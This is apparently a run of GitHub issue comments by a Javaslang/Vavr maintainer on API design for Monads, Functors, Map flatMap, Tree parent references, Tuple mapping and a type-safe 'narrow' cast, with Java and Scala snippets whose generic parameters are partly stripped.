Currently javaslang.collection.Map implementations are the only BiMonads. We could make them Monads regarding the Map values instead:\njava\nfinal class HashMap implements Monad<HashMap<K, ?>, V> {\n    <V2> HashMap<K, V2> flatMapM(Function<? super V, ? extends Kind1<HashMap<K, ?>, V2>> mapper);\n}\nHowever, Scala supports Map.flatMap:\n``` scala\nscala> Map(1 -> \"a\", 2 -> \"b\", 3 -> \"c\")\nres0: scala.collection.immutable.Map[Int,String] = Map(1 -> a, 2 -> b, 3 -> c)\nscala> res0.flatMap(entry => List(entry))\nres1: scala.collection.immutable.Map[Int,String] = Map(1 -> a, 2 -> b, 3 -> c)\nscala> res0.flatMap(entry => List(entry._2))\nres2: scala.collection.immutable.Iterable[String] = List(a, b, c)\nscala> res0.flatMap(entry => List(entry._1))\nres3: scala.collection.immutable.Iterable[Int] = List(1, 2, 3)\n```\n@johnmcclean-aol I'm currently 'hardening' the Monad implementation in Javaslang and not sure in which direction I should push it for Maps. How does AnyM in cyclops handle lifting of functions and applying Map Monads? Do you have an example? Thank you!\n. In my opinion Map should be of type Monad over Tuple1<K, V> instead of type BiMonad over K and V.\nThe only caveat is that the Monad.flatMapM can't return the right type:\n``` java\ninterface MyType extends Monad, Tuple2> {\n    // result can't be MyType because we only have U\n     Monad, U> flatMapM(Function<? super Tuple2, ? extends Kind1, U>> mapper);\n}\ninterface MyType extends BiMonad, T1, T2> {\n    // return type ok\n     MyType flatMapM(BiFunction<? super T1, ? super T2, ? extends Kind2, U1, U2>> mapper);\n}\n```\nUpdate: seeing this, all starts to get clear to me. The flatMapM method simply has to return Monad<M, U> instead of M<U> and all is fine. There is no such thing as BiMonad.\n/cc @johnmcclean-aol I think I got it. You don't need to provide examples.\nUpdate2: No, it does not work :-/ The generic type U must be of Tuple2, which can't be forced.\n. The flavor of the component type needs to be fixed. E.g. is it Object, Tuple2, ...\n``` java\npublic interface Functor {\n<U extends COMP> Functor<COMP, U> map(Function<? super T, ? extends U> f);\n\n}\npublic interface Monad, COMP, T extends COMP> extends Kind1, Functor {\n<U extends COMP> Monad<M, COMP, U> flatMapM(Function<? super T, ? extends Kind1<M, U>> mapper);\n\n@Override\n<U extends COMP> Monad<M, COMP, U> map(Function<? super T, ? extends U> mapper);\n\n}\npublic final class HashMap implements Map, Monad, Tuple2, Tuple2> {\n@Override\n    public  Monad, Tuple2, U> flatMapM(Function<? super Tuple2, ? extends Kind1, U>> mapper) {\n        ...\n    }\n}\n```\nHowever, the Tuple2 elements of U are still missing...\nUpdate: The signatures get too noisy. I will flatMap/map over values for Maps and keep the keys fixed. If another behavior is needed for Monad, we will open a ticket. However, the Map interface will still have other useful map and flatMap method which return Maps! But these are not (and cannot be) part of the Monad interface. Monad is a marker interface and intended to be used only within the algebraic layer.\n. I currently redesign the Monad stuff because I have one thing in mind: we need to preserve the behavior of the underlying Monad.\nI'm in fear of loosing 'state'. In these examples) we allow to flatMap over a cascade of different Monads. This is possible because we relaxed the Monad Laws there. But Scala does not allow this in general:\n``` scala\nimport scala.util._\nobject tests {\nval f : (String, Int) => String = (s, i) => s + i\n//                     v-------------------------v type mismatch; found : Option[String] required: scala.util.Try[?]\n  Try(\"hi\").flatMap(s => Option(1).map(i => f(s, i)))\nfor {\n     s <- Try(\"hi\")\n     i <- Some(1) // <- type mismatch; found : Option[String] required: scala.util.Try[?]\n  } yield f(s, i)\n}\n```\nTo be further investigated. Would be interesting to see how Haskell behaves.\n. I will go back to the Monad we currently have - it is the best solution. But instead of Value, sub-classes/-interfaces of Value will implement Monad.\n``` java\ninterface Functor {\n     Functor map(Function<? super T, ? extends U> f);\n}\ninterface Monad extends Functor {\n<U> Monad<U> flatMap(Function<? super T, ? extends Iterable<? extends U>> mapper);\n\n@Override\n<U> Monad<U> map(Function<? super T, ? extends U> mapper);\n\n}\ninterface Traversable extends Monad {\n@Override\n<U> Traversable<U> flatMap(Function<? super T, ? extends Iterable<? extends U>> mapper);\n\n@Override\n<U> Traversable<U> map(Function<? super T, ? extends U> mapper);\n\n}\ninterface List extends Traversable {\n@Override\n<U> List<U> flatMap(Function<? super T, ? extends Iterable<? extends U>> mapper);\n\n@Override\n<U> List<U> map(Function<? super T, ? extends U> mapper);\n\n}\ninterface Map extends Traversable> {\n@Override\n<U> List<U> flatMap(Function<? super Tuple2<K, V>, ? extends Iterable<? extends U>> mapper);\n\n@Override\n<U> List<U> map(Function<? super Tuple2<K, V>, ? extends U> mapper);\n\n}\ninterface Option extends Monad {\n@Override\n<U> Option<U> flatMap(Function<? super T, ? extends Iterable<? extends U>> mapper);\n\n@Override\n<U> Option<U> map(Function<? super T, ? extends U> mapper);\n\n}\n```\n. Thank you! I will stick with the current behavior in Javaslang, just cleaning up a bit... slightly :-)\n. Javaslang has to be more restrictive. The method signatures of map and flatMap must match across the whole inheritance tree. The best I can do for Maps is to return sequences of mapped results (which might not be Tuples). I'm looking forward to see your solution.\n. Very good! That saves memory/GC cycles.\n. Thank you very much!\n. Yes, this would be great! I also thought about it. Scala does it not but Scala is not perfect.\nThank you!\n. This is equivalent to last and lastOption. List.lastOption will return Some(null) if the last element is null.\n. Naming :-/\nJavaslang\n``` java\npublic interface Functor2 {\n<U1, U2> Functor2<U1, U2> map(BiFunction<? super T1, ? super T2, ? extends Tuple2<? extends U1, ? extends U2>> f);\n\n<U1, U2> Functor2<U1, U2> map(Function<? super T1, ? extends U1> f1, Function<? super T2, ? extends U2> f2);\n\n<U1, U2> Functor2<U1, U2> map2(Function<? super Tuple2<? super T1, ? super T2>, ? extends Tuple2<? extends U1, ? extends U2>> f);\n\n}\npublic interface Validation extends Applicative, E, T> / TODO: Monad, Value / {\n<U, R> Validation<U, R> bimap(Function<? super E, ? extends U> invalidMapper, Function<? super T, ? extends R> validMapper);\n\n}\npublic interface Either extends Monad, R>, Value {\n<X, Y> Either<X, Y> bimap(Function<? super L, ? extends X> leftMapper, Function<? super R, ? extends Y> rightMapper);\n\n}\n```\nScalaz\n``` scala\ntrait Bifunctor[F[, ]] {\n  def bimapA, B, C, D: F[C, D]\n}\nobject Bifunctor {\n  import Scalaz._\nimplicit def Tuple2Bifunctor: Bifunctor[Tuple2] = new Bifunctor[Tuple2] {\n    def bimapA, B, C, D =\n      (f(k._1), g(k._2))\n  }\nimplicit def EitherBifunctor: Bifunctor[Either] = new Bifunctor[Either] {\n    def bimapA, B, C, D =\n      k match {\n        case Left(a) => Left(f(a))\n        case Right(b) => Right(g(b))\n      }\n  }\nimplicit def ValidationBifunctor: Bifunctor[Validation] = new Bifunctor[Validation] {\n    def bimapA, B, C, D =\n      k match {\n        case Failure(a) => failure(f(a))\n        case Success(b) => success(g(b))\n      }\n  }\nimport java.util.Map.Entry\n  import java.util.AbstractMap.SimpleImmutableEntry\nimplicit def MapEntryBifunctor: Bifunctor[Entry] = new Bifunctor[Entry] {\n    def bimapA, B, C, D = new SimpleImmutableEntry(f(k.getKey), g(k.getValue))\n  }\n}\n```\n. I think we should stick with Functor2 in Javaslang. That goes along with Tuple and Function naming.\nTo reduce complexity, we should completely remove the (only on my local branch existing) method Functor2.map2(Function<Tuple2,Tuple2>).\nIt remains the question, how we should name the the Functor2 methods:\n``` java\n Functor2 map(BiFunction<? super T1, ? super T2, ? extends Tuple2<? extends U1, ? extends U2>> f);\n Functor2 map(Function<? super T1, ? extends U1> f1, Function<? super T2, ? extends U2> f2);\n```\nI'm not a big fan of naming these methods map2 or bimap instead. The latter does not scale very well when map methods with more arguments are needed. The former is not consistent with many other functions in Javaslang, e.g. Function.of, Function.lift, Monad.lift, Validation.combine etc. These would need a cardinality number, too.\nThe only argument against naming the methods Functor2.map is raising ambiguities. But we know that only one of the Functor, Functor2 resp. Monad, Monad2 interfaces is implemented. Therefore we will name the methods just map.\n. Mmhh, or maybe Functor2.bimap because we will not have Functor, Monad etc. with cardinality > 2.\nBut does it then need to be biflatMap(BiFunction) instead of flatMap? Currently we have just flatMap or flatMapM (from Monad) to circumvent ambiguities in Traversable impls.\n. The right-biased Either<L, R> may implement Functor and Functor2 as well. If Functor2 has bimap instead of map it would clarify mapping behavior.\n. Not sure if we need\n``` java\ninterface Monad2, T1, T2> extends Kind2, Functor2\nfinal class HashMap implements Map, Monad2, K, V>\n```\nIt should be instead\n``` java\ninterface Monad, T extends Tuple> extends Kind, Functor\nfinal class HashMap implements Map, Monad, Tuple2>, Functor2\n```\n. If we need no Monad2, then I will rename Functor2 to BiFunctor. The cardinalities are not related to each other, i.e. a Monad is a Functor but also can be a BiFunctor.\n. See also #1018 \n. We need Monad2 because we need a different Kind of flatMapM than Monad has. Otherwise we would loose the component types of the result.\n``` java\npublic interface Monad2, T1, T2> extends Kind2, Functor2 {\n<U1, U2> Monad2<M, U1, U2> flatMapM(BiFunction<? super T1, ? super T2, ? extends Kind2<? extends M, ? extends U1, ? extends U2>> mapper);\n\n<U1, U2> Monad2<M, U1, U2> flatMapM(Function<? super Tuple2<? super T1, ? super T2>, ? extends Kind2<? extends M, ? extends U1, ? extends U2>> mapper);\n\n}\n```\nCompared to Monad:\n``` java\npublic interface Monad, T> extends Kind, Functor {\n<U> Monad<M, U> flatMapM(Function<? super T, ? extends Kind<? extends M, ? extends U>> mapper);\n\n}\n``\n. Given that we will stay withFunctor2.mapmethods instead ofbimap, otherwise (some) implementing classes would have nomapmethod which would be confusing because there areflatMapmethods.\n. Convention:\n-maptakes _one_ argument, e.g.map(Function)_or_map(BiFunction)-bimaptakes _two_ arguments, e.g.bimap(Function, Function)`\nGiven this we are consistent with Either and Validation.\n. I think you are right. This may come handy when processing syntax trees, the main reason I added a generic tree impl. Are you interested in doing these changes? I would greatly appreciate it!\n. @manu-m @ruslansennov I had once an immutable Tree impl. But the update operations were non-trivial. Here is the old version: https://github.com/javaslang/javaslang/blob/parser/src/main/java/javaslang/collection/Tree.java\nThat version has no Leaf/Node interfaces. Because of the immutability, operations on tree nodes take O(n). A copy of the whole tree is needed on each operation - in both directions: up to the root, down to the children - and the tricky part: from the parent down to the children other than the current node. And for these the same procedure. This logic is abstracted in TreeTransformer (see link above).\nI have to sleep one night over this topic to get a clear picture if it really makes sense to add parent nodes and how this could be achieved. For example we could maintain an immutable tree without parent nodes and decorate it with a lazy view on that tree, which is constructed while traversed, adding the parent information only if needed. This would reduce the complexity of operations.\nExample:\nHere I will use <T> because it is simpler for me.\nWe already have this (without parents):\njava\nTree.of(t1, Tree.of(t2), Tree.of(t3))\nresults in\nNode(t1)\n    /       \\\nNode(t2)  Node(t2)\nWe could now return a TreeView on a Tree which adds parents:\n``` java\nTree tree = Tree.of(t1, Tree.of(t2), Tree.of(t3));\n// internally calls new TreeView(Option.none(), tree);\nTreeView withParents = tree.withParents();\n```\nwith this implementation:\n``` java\ninterface TreeView extends Tree, HasParent {\nList<NodeView<T>> getChildren();\n\n}\nfinal class NodeView implements TreeView, Serializable {\nfinal Option<NodeView<T>> parent;\nfinal Node<T> node;\nfinal Lazy<List<NodeView<T>>> children;\n\nNodeView(Option<NodeView<T>> parent, Node<T> node) {\n    this.parent = parent;\n    this.node = node;\n    this.children = Lazy.of(() -> node.getChildren().map(child -> new NodeView<>(this, child)));\n}\n\n@Override\npublic List<NodeView<T>> getChildren() {\n    return children.get();\n}\n\n}\ninterface HasParent {\n    boolean isRoot;\n    Option> getParent();\n}\n```\nCurrently the use of Tree, Node, Empty is messed up a little bit. The empty() and of() methods should return Tree instead of Node and Empty. To check if the main idea of using views works we need a proof of concept.\nNote: It is still not clear if and how we should propagate changes up, e.g. when we call setValue(T) on the current NodeView.\nUpdate:\nThe TreeView could come with a RootView implementation, which makes it unnecessary to store the parent as Option for every node in a tree rather than just the reference.\nAlso I think that setValue should not be allowed. Instead we need to use map, transform or a special tree visitor / tree transformation mechanism to change trees in an efficient way.\nWe should look at real-world use-cases in order to build this. For example transforming Abstract Syntax Trees. There should be many examples on the net. We could build our API on top of this to get the simplest approach possible.\n. @manu-m I think we should do the changes step by step, as you suggested. First we change the interface to public interface Tree<T> extends Traversable<Node<T>>. That will be a good 'warmup'. After that we add the parents. It is good to separate these two things.\n. This needs to be done before 2.0.0 because it changes the interface. I will do that along with root references with views as I suggested.\n. We can't make Tree<T> extend Traversable<Node<T>> instead of Traversable<T> because overloaded methods can't return Tree<Node<T>>. The compiler wants a Traversable<Node<T>>. There is nothing we can do about that.\nMy suggested solution: Our Tree.traverse() method will return Seq<Node<T>> instead of Seq<T>. Then we have all possibilities.\n. I think with the last additions we are safe to make 2.0.0 final. The existing interface methods need not to be modified in order to add the root reference later.\n. Parent references will be added next release.\n. Tree is dropped in Vavr 1.0. It will be added to Vavr 1.1 as part of the vavr-collectionx module, along with BitSet, PriorityQueue, MultiMap and MultiSet.\nI suggest to you to wait for 1.1 then.. This is really nice when mapping just a few components:\n``` java\n// (1, 2, 3, 4, 5, 6, 7, 8) -> (1, \"two\", 3, 4, \"five\", 6, 7, \"last\")\ntuple8.map2(i -> \"two\")\n      .map5(i -> \"five\")\n      .map8(i -> \"last\");\n// the same as above but can get cumbersome when mapping gets more complex\ntuple8.map((i1, i2, i3, i4, i5, i6, i7, i8) -> Tuple.of(i1, \"two\", i3, i4, \"five\", i6, i7, \"last\"));\n```\n. Right!\nBut... I have completely removed the methods reduceRightOption, reduceLeftOption from Traversable. They are now implemented as default in Value. There where also other unnecessary impls I think.\nThis PR can be closed. I urgently need to push my changes. They get more and more while refactoring this Monad stuff. Please wait until I've pushed them today...\n. (I've also fixed that bug already)\n. This is what I've done so far. Too much for one PR I think O_o\nhttps://github.com/javaslang/javaslang/compare/master...danieldietrich:master\n. I broke my new-years resolution to create local branches instead of working on my master. Needs to get better...\n. Driving idea:\njava\n<U> U transform(Function<Tuple2<T1, T2>, ? extends U> f);\nis basically the same as\njava\n<U> U map(BiFunction<? super T1, ? super T2, ? extends U>);\nPros of map:\n- We need map. Removing transform simplifies the API.\n- We have the contained values at hand and don't need to extract them from the Tuple. The tuple itself is not needed for mapping the values.\n- The target type may be a Tuple, therefore we don't need an additional map(Function<Tuple,Tuple>)\nCons:\n- If mapped to a Tuple, the Tuple has to be created by hand. However, then map1, ..., mapn can be used.\n. Because Tuple0 has no components, we need a <U> Tuple0.map(Supplier<? extends U>) that replaces transform.\n. There are situations a map(Function, Function, ..., Function) is handy, e.g. when used in combination with method references. We already have it. Example:\njava\n// Map.unzip3(Function<Tuple2, Tuple3>) return Tuple3<Seq, Seq, Seq>\niterator().unzip3(unzipper).map(Stream::ofAll, Stream::ofAll, Stream::ofAll);\nHowever, when having this kind of map function and the map function mentioned in the comments above, Tuple1 would have:\njava\n<U> Tuple1<U> map(Function<? super T, ? extends U> f);\n<U> U map(Function<? super T, ? extends U> f);\nwhich raises ambiguities.\nTherefore we take the current approach, which is conform to the Functor contract:\njava\n<U> Tuple1<U> map(Function<? super T, ? extends U> f);\nbut simplify our transform in the way that it takes Supplier, Function, BiFunction, Function3 instead of Function of Tuple0, Tuple1, Tuple2, Tuple3, ...\n. Especially check if algebraic properties are correctly inherited, e.g.\n- Set is no Functor\n- Map is Functor on values but not on key and therefore no BiFunctor\n- Tuple2 is a BiFunctor\n. We will not do that since the property test component is in its own module now.\n. Here is another example of a bound that is currently suspicious:\njava\ninterface Try<T> {\n    <U> Try<U> flatMap(Function<? super T, ? extends Try<? extends U>> mapper);\n    <U> Try<U> flatMapTry(CheckedFunction<? super T, ? extends Try<? extends U>> mapper);\n}\nWhen we follow the types (in the sense that @SuppressWarnings(\"unchecked\") disappear, then this seems to be a better solution:\njava\ninterface Try<T> {\n    <U> Try<U> flatMap(Function<? super T, ? extends Try<U>> mapper);\n    <U> Try<U> flatMapTry(CheckedFunction<? super T, ? extends Try<U>> mapper);\n}\nBut on the other hand, Try<? extends T> is of type Try<T> because Try<? extends T>.get() is of type T. And ? extends Try is of type Try.\n\nUpdate / question solved:\njava.util.stream.Stream uses\njava\n<R> Stream<R> flatMap(Function<? super T, ? extends Stream<? extends R>> mapper);\n. We had a similar issue before, please take a look at this:\nFix result bound of function argument of higher order functions #352\n. I think have we are fine for now.\n. It is even worse. java.util.stream.Stream#findFirst() is equivalent to headOption(). We should rename our findFirst(Predicate) to find(Predicate).\n. Java's Stream.findFirst() and findAny() are related to getting one or none element of a Stream that may be empty. The order of elements cannot be predicted in general, because of the parallel nature of Java's Stream.\nIn Javaslang we don't have to cope with all this in our collections. Therefore findFirst and findAny are not needed.\n. Note: The Monad tests are temporarily deactivated. This probably is the reason for the decreased code coverage.\n. @ruslansennov I try to be diplomatic :smile: - they will be re-activated soon.\nI had to deactivate them because Value is no Monad any more. This is because our new Validation (which will extend Value soon) is an Applicative.\nI will pull these things now to go on with the other issues. If you have any remarks, please comment on the code anyway...\n. Thank you, Eric!\n. Value implements Foldable. Therefore I will rename Validation.fold to bifold and introduce an interface BiFoldable:\n``` java\npublic interface BiFoldable {\n<U> U bifold(Function<? super T1, ? extends U> f1, Function<? super T2, ? extends U> f2);\n\n}\n``\n. The only possibility to solve this issue is to\n1. remove flatMap from Value\n2. change flatMap signature of single-valued types to SELF flatMap(Function>)` (informally), where SELF is the currently self type, e.g. Option or Try.\nI have in mind that instead of implementing Monad directly, we need some kind of conversion from types to Monads. For example option.monad() returns a Monad instance backed by the current Option.\nWe could go one step further and also remove other algebra-interfaces from the type hierarchy. E.g. Validation may not implement Applicative to get the ap method signature right and the Kind2 out of the way. Instead Validation could also get a method applicative() which returns an Applicative view on the Validation.\nThese methods could also be located in the Algebra layer itself, e.g.\n``` java\ninterface Applicative {\n    static  Applicative of(Valiation validation) { ... }\n    ...\n}\ninterface Monad {\n    static  Monad of(Option option) { ... }\n    static  Monad of(Traversable traversable) { ... }\n    ...\n}\n```\nNote: Implicit conversion methods between Values and Monads would help.\nThis would decouple (parts of) the algebraic layer. The only Monad functionality we use is lifting functions.\nAlso Functor and BiFunctor should not be directly implemented by Value classes. Foldable is a little bit misplaced in the algebraic layer but it depends on Monoid, which is algebraic.\n. Also Lazy needs some rework\n- remove Defined / Undefined\n- filter returns Option\n. Value.ifEmpty, ifDefined make no sense IMO.\n. Future.fromTry(Try) vs. Validation.from(Either)\n. Instead of\njava\nT ifDefined(T trueVal, T falseVal);\nit would be better to have\njava\n<U> U ifDefined(Function<? super T, ? extends U> valMapper, U other);\nbut this is equivalent to\njava\nvalue.map(t -> u).getOrElse(other);\nTherefore we don't need the ifEmpty, ifDefined methods.\n. There is no undefined Lazy if Lazy.filter returns Option. Therefore Value will not have a toLazy conversion.\n. Hi @patrox, yes - the solutions fit great. In the third case I have an Iterator in mind wrapped by a stream. Let's take the name extend because continue is a keyword.\nI'm on my phone and give a prototype of the Iterator later.\n. This should work:\n``` java\ndefault Stream extend(Function<? super T, ? extends T> f) {\n    Objects.requireNonNull(f, \"f is null\");\n    if (isEmpty()) {\n        return this;\n    } else {\n        final Stream that = this;\n        return Stream.ofAll(new AbstractIterator() {\n        Stream<T> stream = that;\n        T last = null;\n\n        @Override\n        protected T getNext() {\n            if (stream.isEmpty()) {\n                stream = Stream.gen(last, f);\n            }\n            last = stream.head();\n            stream = stream.tail();\n            return last;\n        }\n\n        @Override\n        public boolean hasNext() {\n            return true;\n        }\n    });\n}\n\n}\n```\n. Nice, thank you!\n. Hey @patrox,\nI'm thankful for your support and am looking forward to integrate this new feature into 2.0.0.\nJust for the planning: things committed before 15.3. will go into Javaslang 2.0.0. Then we have to make a code-freeze for 2.0.0 in order to get homepage and docs right.\n. Thx! \ud83d\udc4d\ud83c\udffd\n. Awesome, thanks!\n. @RobWin Would you please review it and take a critical look?\nDo the changes make sense? I think we need to still change onSuccess and onFailure.\njava\nmyTry\n    .onSuccess(CheckedConsumer) // <-- currently changes the result if consumer fails, which is wrong IMO\n    .onFailure(CheckedConsumer)\nSame for Future.\n. Thank you Robert, that helped. I re-added the *Try() methods after testing a bit with futures. It makes life easier to have both flavors - checked and unchecked function args.\n. Well done, thank you Ruslan!\n. Thanks, that was fast! Should be able to create RC3 at the end of this weekend. Then only tests and bug fixes follow. 2.0.0 final is near :)\n. I think also that Monad is not a good fit here. I will rename MatchMonad to MatchValue.\nMaybe Match.MatchFunction and Match.MatchValue should be names Match.Function and Match.Value.\nOr maybe Match.Fun and Match.Val in order to prevent a name collision with the existing Function and Value.\n. Thank you!\n. > yay - no more test code in prod\n:+1: :smile: \nYes, I'm on it. Website and documentation will get some love within the next days\n. Done. This will be continued in more detail... (download links, api references etc.)\n. Thank you!\n. Thank you! Did you profile it?\n. Great!!\n. In theory, theory equals practice. Or as Lenin said \"Trust but verify\" (or something like this) :-))\n. Moving back contains from Value to Traversable...\n. Maybe this could affect even more methods, e.g. let's take a look at java.util.Map:\njava\n    boolean containsKey(Object key);\n    boolean containsValue(Object value);\n    V get(Object key);\n    V put(K key, V value);\n    V remove(Object key);\n    ...\n. @ruslansennov @netzwerg @RobWin I think this goes in the wrong direction. We loose type safety, which is no good idea. In Rahels example we just need to cast the List<Double> to a List<Number> and all is fine. But Java says we can only get a List<? extends Number>, which is useless. Even if contains is fixed, we still have no working prepend etc.\nI've sketched a type safe solution, which introduces a type-safe cast:\n``` java\nimport javaslang.collection.List;\nimport java.math.BigDecimal;\npublic class Test {\npublic static void main(String[] args) {\n\n    //\n    // Initial situation:\n    //   We have a type 'Double' which is in between other types\n    //   within a specific type hierarchy.\n    //\n\n    List<Double> doubles = List.of(1d);\n\n    //\n    // Our intuition says that a List<Double> is a List<Number>\n    //\n\n    // error: \"Incompatible types\"\n    List<Number> numbers1 = doubles;\n\n    // error: \"Inconvertible types\"\n    List<Number> numbers2 = (List<Number>) doubles;\n\n    // Works, but captured generics are useless\n    // as we will see in the following examples\n    List<? extends Number> numbers3 = doubles;\n\n    // prepend (capture<? extends Number>) in List cannot be applied to (BigDecimal)\n    numbers3.prepend(new BigDecimal(\"0\"));\n\n    // prepend (capture<? extends Number>) in List cannot be applied to (Number)\n    numbers3.prepend((Number) new BigDecimal(\"0\"));\n\n    //\n    // In a mutable world it would be possible to\n    //\n    //    List<Double> doubles = List.of(1d);\n    //    List<Number> numbers = cast(doubles);\n    //    numbers.add(new BigDecimal(\"0\"));\n    //    // now doubles contains a BigDecimal, what is wrong\n    //\n    // In an immutable world it is pretty eligible to assume\n    // that a List<Double> is a List<Number>. Looking at the\n    // example above, we now have:\n    //\n    //    List<Double> doubles = List.of(1d);\n    //    List<Number> numbers = cast(doubles);\n    //    List<Number> newNumbers = numbers.add(new BigDecimal(\"0\"));\n    //    // doubles remains the same\n    //\n\n    List<Number> numbers4 = (List<Number>) (Object) doubles;\n    numbers4.contains(42d);\n    numbers4.contains(new BigDecimal(\"1\"));\n    numbers4.prepend(42d);\n\n    final List<Number> newNumbers4 = numbers4.prepend(new BigDecimal(\"1\"));\n\n    //\n    // We abstract over (List<Number>) (Object) doubles and provide\n    // a _safe_ API to perform correct casts:\n    //\n\n    List<Number> test = List.empty();\n\n    // does not compile: \"inference variable U has incompatible bounds\"\n    List<Double> wrong = cast(test);\n\n    // does compile!\n    List<Number> right = cast(doubles);\n\n}\n\n@SuppressWarnings(\"unchecked\")\nstatic <T extends U, U> List<U> cast(List<T> list) {\n    return (List<U>) list;\n}\n\n}\n```\nWhat do you think?\n. It will be part of each collection type. E.g.\njava\ninterface List<T> {\n    @SuppressWarnings(\"unchecked\")\n    static <T extends U, T> List<U> cast(List<T> list) {\n        return (List<U>) list;\n    }\n}\nNote: it would be nice to have an instance method but we can't express a lower-bound generic like this:\njava\ninterface List<T> {\n    // <U super T> does not compile\n    @SuppressWarnings(\"unchecked\")\n    default <U super T> List<U> cast() {\n        return (List<U>) this;\n    }\n}\nIs there a better name for cast?\nBut wait...\nMaybe we already have that method, it is ofAll and we just need to fix the generics, e.g.\njava\ninterface List<T> {\n    @SuppressWarnings(\"unchecked\")\n    static <T extends U, T> List<U> ofAll(Iterable<? extends T> elements) {\n        Objects.requireNonNull(elements, \"elements is null\");\n        if (elements instanceof List) {\n            return (List<U>) elements;\n        } else if (elements instanceof java.util.List) {\n            List<U> result = Nil.instance();\n            final java.util.List<T> list = (java.util.List<U>) elements;\n            final ListIterator<T> iterator = list.listIterator(list.size());\n            while (iterator.hasPrevious()) {\n                result = result.prepend(iterator.previous());\n            }\n            return result;\n        } else if (elements instanceof NavigableSet) {\n            List<U> result = Nil.instance();\n            final java.util.Iterator<T> iterator = ((NavigableSet<T>) elements).descendingIterator();\n            while (iterator.hasNext()) {\n                result = result.prepend(iterator.next());\n            }\n            return result;\n        } else {\n            List<U> result = Nil.instance();\n            for (T element : elements) {\n                result = result.prepend(element);\n            }\n            return result.reverse();\n        }\n    }\n}\n. A few months ago I started a discussion about this topic on twitter: https://twitter.com/danieldietrich/status/669534660561629185\nThe replies are interesting, in particular those of Peter Lawrey (this), Jean-Baptiste Giraudeau (this) and Brian Goetz (this).\nInterestingly the binarySearch was also mentioned there :-)\n. Oohh, you're right - awesome :smile: I love this library - everything just works\u2122\n. @netzwerg @RobWin I see, List.ofAll(...) is not a good name for our use-case.\nWhat we really need in order to use the type-safe variants contains(T), prepend(T), ... is a unsound type system like that of Dart: Why Dart Types Are Optional and Unsound (scroll down to Why are generics covariant?).\nThe essence of that document is: a ReadOnlyReference is a ReadOnlyReference.\nJava does not have a unsound type system. The best we can do is: ReadOnlyReference is a ReadOnlyReference<? extends Number>.\nSo we have to choices:\n1. Use an unsafe Object instead of a safe T everywhere we need to circumvent Java's type system. That requires us to clutter our code with unsafe type casts. Ruslan did already the change in this PR. There are many places which may throw a ClassCastException. Trust me - we don't want to have such unsafe code in production, if there is safe solution.\n2. The safe solution makes use of the fact that ReadOnlyReference is a ReadOnlyReference. We can just cast it. But we need a human-readable API for that. Any suggestions? ofAll(...)  seems to be confusing. Is cast(...) or safeCast(...) better? The Method needs to be static because the generic bound is super, which cannot be expressed in an instance method. And because we do not have higher-kinded types/type constructors, we need to implement that methods for each type.\nNote: It is not sufficient to use contains(Object) and indexOf(Object). There are plenty of more methods which need to take Object instead of T because a (capture of ? extends T) does not allow us to insert subtypes of T. Example: java.util.List.add(1.0d) is not possible on a List<? extends Number>\n. ### The Problem\nWe have List<Double> doubles = ....\nWe want a List<Number> numbers = doubles.\nBut the best Java offers us is List<? extends Number> numbers = doubles.\nFacts\nAbout the types:\n- List<Number> numbers = doubles; does not compile\n- List<Number> numbers = (List<Number>) doubles; does not compile\n- List<Number> numbers = (List<Number>) (Object) doubles; does compile but is unsafe\nIt is not possbile to\n- create an instance method cast with List<Number> numbers = doubles.cast(); because we are not allowed to express lower bound generics:\n``` java\ninterface List {\n// not possible\n<U super T> List<U> cast() {\n    return (List<U>) this;\n}\n\n// also not possible\n<U> List<U super T> cast() {\n    return (List<U>) this;\n}\n\n}\n``\n- create a generalcast` methods because of the lack of higher-kinded types/type constructors:\n```\ninterface Predef {\n// not possible:\nstatic <M<T>> M<T> cast(M<? extends T> type) { ... }\n\n// workaround, but return type not helpful here\nstatic <M extends Kind<M, ?>, T> Kind<M, T> cast(Kind<M, ? extends T> type) { ... }\n\n}\n```\nSolution\nThis leads to a static cast method per type.\nExample: List\njava\ninterface List<T> {\n    static <T> List<T> cast(List<? extends T> list) { ... }\n}\nNote: List.ofAll(...) does exactly what cast does (+ additional things with other inputs). But ofAll is not convenient/comprehensible. The API should exactly describe what happens.\n. @netzwerg please read my previous comment, it clarifies the higher-kinded stuff etc.\nYes, cast is a negative pattern / anti-idiom.\nWe use narrow in the context of Monads/higher-kinded types. A second use case of the same keyword would be confusing.\nAre there other names? Maybe\n- cast, alternatives: https://www.powerthesaurus.org/cast\n- narrow, alternatives: https://www.powerthesaurus.org/narrow\n- unbound, alternatives: https://www.powerthesaurus.org/unbound\n- unbounded, alternatives: https://www.powerthesaurus.org/unbounded\n- unsound, alternatives: https://www.powerthesaurus.org/unsound\nIt is all about types, why not\n- typed, alternatives: https://www.powerthesaurus.org/typed\n. Re-opening this issue to find a better name...\n. I like restrict :+1:\n. I also like infer. restrict sounds like loosing something. But we gain type-safe collection operations that are otherwise not possible in Java. Java can't infer the right type, but we know better because List is immutable.\njava\nList<Number> numbers = List.infer(doubles);\nNote: We also see sorted instead of sort or curried instead of curry. Maybe inferred is better than infer? In the sense of give me an inferred version instead of infer that list. On the other hand there is sum and zip instead of summed and zipped. Never understood the difference. I think most of the ...ed methods take no arguments. The static infer/inferred method does also take no arguments other than the instance itself, i.e. it is an extension method. That would indicate inferred.\nOh my gosh - naming things is so hard... :)\n. What did you say?\nList.whatAboutTypeSafeUpCast() ? ;)\nI like typeSafe, too. Maybe it has to be List.typeSafe\u2122() :-)\n. upCast is like cast, which is a smell because it is unsafe in general.\nMmhh, narrow fits very good. I think it does not collide with Monad.narrow(). javaslang has no dependency to javaslang-algebra.\nCheck?\n. Collections got narrow(). Do other types also need narrow()? E.g. Option, Try, Either, Future, Validation, Lazy, ... ???\n. Need to add tests for these:\n- Either#narrow(Either) \u2713\n- Future#narrow(Future)\n- Lazy#narrow(Lazy)\n- Option#narrow(Option)\n- Promise#narrow(Promise)\n- Try#narrow(Try)\n- Validation#narrow(Validation) \u2713\n- Value#narrow(Value)\n. Done with #1077 and #1081.\nMoved pending tests to #477 \n. good question, I think all need it\n. ok, we could name it ofIterator() and give a Javadoc hint that it is a shortcut for ofAll(() -> iterator).\nor we don't provide a special method to keep it simple...\nyour opinion?\n. > going back and forth between the two must be as easy as possible.\nYes, you are right. The API should be self-explaining. The easiest solution would be providing a method. We should do that. ofIterator(Iterator) is fine.\n. > My opinion it is unnecessary method :)\nI'm undecided - need to sleep on it\n. Slept more than one night on it and think we don't need it. I will document it how to use Stream.ofAll(Iterable) with an Iterator. Also we will add a best-practice section to our documentation.\n. Thanks!\n. nice, thank you!\n. Thank you! PR welcome\n. @mvh77 Do you have an example? I made a full text search on the javaslang source 